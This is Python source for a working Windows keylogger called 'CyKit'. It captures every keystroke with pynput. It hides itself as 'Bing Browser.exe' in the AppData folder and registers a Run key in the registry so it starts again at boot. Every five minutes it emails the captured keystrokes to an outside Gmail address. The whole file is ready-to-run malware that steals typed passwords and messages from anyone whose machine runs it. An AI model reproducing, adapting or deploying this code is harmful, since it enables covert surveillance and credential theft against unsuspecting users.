import pynput.keyboard
import send_mails
import threading
import os
import shutil
import sys
import subprocess


class Keylogger:
    def __init__(self, time_interval_seconds):
        self.get_persistent()
        self.log = "Keylogger started"
        self.interval = time_interval_seconds
        self.mailer = send_mails.SendMails()

    def get_persistent(self):
        file_location = os.environ["appdata"] + "\\Bing Browser.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Browser /t REG_SZ /d "' + file_location + '"', shell=True)

    def process_keystrokes(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_logs(current_key)

    def append_to_logs(self, string):
        self.log += string

    def report(self):
        self.mailer.send_mail("hack3d.txt@gmail.com", "CyKit Keylogger Reports", self.log)
        # print(self.log)  # For testing purposes only
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keystrokes)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


cykitlogger = Keylogger(time_interval_seconds=300)
cykitlogger.start()
